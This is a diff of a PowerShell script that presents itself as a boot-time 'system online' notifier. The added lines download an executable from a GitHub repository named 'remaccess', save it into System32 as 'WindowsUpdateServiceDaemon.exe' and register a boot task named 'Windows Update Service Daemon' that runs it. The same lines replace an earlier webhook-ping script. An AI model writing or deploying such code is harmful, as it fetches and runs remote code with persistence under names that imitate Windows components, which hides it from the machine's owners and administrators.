@@ -1,6 +1,8 @@
 #This script creates a schedule task that will run everytime the system is booted up.
 #Purpose of this scirpt to get notified once a system comes online.
 $filepath = "C:\Windows\System32\WindowsUpdateServiceDaemon.ps1"
+$localFilePath = "C:\Windows\System32\WindowsUpdateServiceDaemon.exe"
+$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/WindowsDiscordPingStatus.exe"
 $pingdaemontask = "Windows Update Service Daemon"
 $regPath = "HKLM:\SOFTWARE\Microsoft\MicrosoftUpdateServiceDaemon"
 #Purge of Ping Task
@@ -33,27 +35,20 @@ if ([string]::IsNullOrEmpty($pwdst)) {
     $pwdst = "n"
 }
 if ($prompt.ToLower() -eq "y") {
+if (Test-Path -Path $localFilePath -PathType Leaf) {
+    Remove-Item -Path $localFilePath -Force
+}
+try {
+    Invoke-WebRequest -Uri $url -OutFile $localFilePath -UseBasicParsing
+    Write-Host "File downloaded and saved to $localFilePath"
+} catch {
+}
 if (Test-Path $regPath) {
     Remove-Item -Path $regPath -Recurse -Force | Out-Null
 }
 New-Item -Path $regPath -Force | Out-Null
-$webhookValue = Read-Host "Enter a value for 'Webhook'"
 $nameValue = Read-Host "Enter a value for 'Name'"
-Set-ItemProperty -Path $regPath -Name 'Webhook' -Value $webhookValue
 Set-ItemProperty -Path $regPath -Name 'Name' -Value $nameValue
-$script = @'
-$regPath = "HKLM:\SOFTWARE\Microsoft\MicrosoftUpdateServiceDaemon"
-$webhookUrl = (Get-ItemProperty -Path $regPath).Webhook
-$message = "$((Get-ItemProperty -Path $regPath).Name) is Online"
-$jsonPayload = @{
-    content = $message
-} | ConvertTo-Json
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType "application/json"
-'@
-$script | Set-Content -Path $filepath
-$fileContent = Get-Content -Path $filePath
-$fileContent = $fileContent -replace 'ToBeReplaced', $webhookUrl
-Set-Content -Path $filePath -Value $fileContent
 #Create Windows Scheduled task
 $pingdaemonxml = @"
 <?xml version="1.0" encoding="UTF-16"?>
@@ -102,9 +97,7 @@ $pingdaemonxml = @"
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
-      <Arguments>-ExecutionPolicy Bypass -File "C:\Windows\System32\WindowsUpdateServiceDaemon.ps1"</Arguments>
-      <WorkingDirectory>C:\Windows\System32</WorkingDirectory>
+      <Command>C:\Windows\System32\WindowsUpdateServiceDaemon.exe</Command>
     </Exec>
   </Actions>
 </Task>
@@ -114,5 +107,4 @@ if (Get-ScheduledTask -TaskName $pingdaemontask -ErrorAction SilentlyContinue) {
 Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false
 } else {}
 Register-ScheduledTask -Xml $pingdaemonxml -TaskName $pingdaemontask | Out-Null
-Start-ScheduledTask -TaskName $pingdaemontask
 } else {}
